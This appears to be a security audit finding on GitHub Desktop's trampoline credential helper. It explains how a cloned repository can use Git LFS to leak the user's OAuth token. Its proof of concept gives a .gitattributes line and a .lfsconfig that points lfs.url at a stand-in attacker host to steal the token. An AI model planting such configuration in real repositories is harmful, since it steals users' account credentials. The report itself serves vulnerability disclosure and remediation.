### Title
Malicious `.lfsconfig`/tracked repo content can hijack GitHub Desktop's trampoline credential helper to exfiltrate a signed-in account's OAuth token to an attacker-controlled host - (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`)

### Summary
GitHub Desktop configures Git's `credential.helper` to point at its internal "trampoline" for the *entire* subprocess tree of a git operation - not just for the top-level `git fetch`/`clone`/`push` command, but also for anything Git invokes underneath it, explicitly including content filters such as Git LFS. The trampoline's credential-get handler resolves credentials purely by matching the *requested* host/URL against stored accounts, with no verification that the request actually corresponds to the remote/host the user intended to operate on. A cloned/fetched repository can ship a tracked `.lfsconfig` that redirects `lfs.url` to an attacker's server while a `.gitattributes` entry routes files through the `filter=lfs` clean/smudge filter. When Git LFS runs under Desktop's trampoline environment, it will request credentials for a `host` value it controls (e.g. `github.com`) via the shared credential helper, receive back the victim's real GitHub OAuth token, and then hand that token to the attacker-controlled `lfs.url` endpoint over HTTP.

### Finding Description
When Desktop spawns a Git operation, it sets `credential.helper=desktop` via `GIT_CONFIG_PARAMETERS` specifically because "commands invoked by filters (i.e. Git LFS) [need] to be able to pick up our configuration," since arguments are not passed down to filter subprocesses: [1](#0-0) 

This means any subprocess started as part of that git invocation - including Git LFS's smudge/clean filters, which are driven entirely by tracked, attacker-controlled repository files (`.gitattributes` + `.lfsconfig`) - inherits the same `DESKTOP_TRAMPOLINE_TOKEN`/`DESKTOP_PORT` and can talk to the trampoline server as a legitimate credential-helper client.

The trampoline server's only access control is that the token be one of the currently "active" tokens for an in-flight operation - it does not bind the token to a specific host or remote: [2](#0-1) [3](#0-2) 

The credential-get handler resolves credentials solely from the `host`/`url` fields present in the incoming credential request (which Git LFS derives from `.lfsconfig`'s `lfs.url`, a value fully controlled by the cloned repository), with no cross-check against the repository's actual `origin` remote or the URL the top-level git operation is targeting: [4](#0-3) [5](#0-4) 

Because `findGitHubTrampolineAccount` matches purely on `new URL(...).origin`, a credential request whose `host` is `github.com` will match the user's real signed-in GitHub.com account and return `credWithAccount`, which sets `password` to the account's real OAuth token: [6](#0-5) 

The corrupted value is the `password`/`username` fields returned by `formatCredential(cred)` in the credential-helper `get` response - it is silently populated with the real GitHub token even though the request did not originate from (and is not scoped to) the actual git remote of the operation the user initiated.

### Impact Explanation
A successful attack exfiltrates the victim's real GitHub.com (or GHE) OAuth token to an attacker-controlled server, without any user interaction beyond cloning/fetching a malicious repository and having Git LFS installed (a very common, often bundled, prerequisite for GitHub workflows). The stolen token grants the attacker the same account access GitHub Desktop has (repo read/write, depending on token scopes), which can be used to push malicious commits, read private repos, or pivot further - a direct credential/token exfiltration impact.

### Likelihood Explanation
Likelihood is moderate: it requires the victim to have Git LFS installed and to clone/fetch an attacker-controlled repository containing a crafted `.gitattributes` + `.lfsconfig`. No interactive prompts, admin rights, or pre-existing local compromise are needed - the entire trigger is repository content processed automatically during a normal clone/fetch/checkout, which is exactly within the "attacker controls a cloned/fetched repository" threat model. Existing guards (trampoline token validity check, per-operation background-task suppression) do not restrict *which host* a valid token may request credentials for, so they do not stop this path.

### Recommendation
Bind each trampoline token to the specific remote/host(s) the originating git operation is permitted to authenticate against (recorded when `withTrampolineEnv`/`withTrampolineToken` is invoked), and reject `CREDENTIALHELPER get` requests whose `host`/`url` does not match that allow-list. Alternatively, do not propagate `credential.helper=desktop` to filter/LFS subprocesses at all, or restrict Git LFS/filter credential lookups to the URLs derived from the repository's own configured remote rather than arbitrary `.lfsconfig`-supplied values.

### Proof of Concept
1. Create a malicious public repository containing:
   - `.gitattributes`: `secret.bin filter=lfs diff=lfs merge=lfs -text`
   - `.lfsconfig`: `[lfs]\n url = "https://attacker.example/lfs"`
   - a tracked `secret.bin` placeholder pointer file.
2. Victim, who is signed into `github.com` in GitHub Desktop and has Git LFS installed, clones/fetches this repository via Desktop.
3. Desktop performs the git operation with `withTrampolineEnv`, setting `GIT_CONFIG_PARAMETERS` to `credential.helper=desktop` for the whole process tree [1](#0-0) .
4. During checkout, Git invokes the `lfs` smudge filter for `secret.bin`; Git LFS reads `.lfsconfig`'s `lfs.url` (attacker's endpoint) and, needing to authenticate to it, runs `git credential fill` with `host=github.com` (or whatever host the attacker embeds) using the inherited trampoline env vars.
5. The request reaches `trampolineServer` → `createCredentialHelperTrampolineHandler` → `getCredential` → `getGitHubCredential`, which matches the victim's real GitHub account by origin and returns their OAuth token [4](#0-3) .
6. Git LFS sends that token as Basic Auth credentials to `https://attacker.example/lfs`, exfiltrating it to the attacker.

    }

    const handler = this.commandHandlers.get(command.identifier)

    if (handler === undefined) {
      socket.end()
      return
    }

    const result = await handler(command).catch(e =>
      log.error('Error processing trampoline command', e)
    )

    if (result !== undefined) {
      socket.end(result)
    } else {
      socket.end()
    }

export async function findGitHubTrampolineAccount(
  accountsStore: AccountsStore,
  remoteUrl: string
): Promise<Account | undefined> {
  const accounts = await accountsStore.getAll()
  const parsedUrl = new URL(remoteUrl)
  return accounts.find(
    a => new URL(getHTMLURL(a.endpoint)).origin === parsedUrl.origin
  )
}
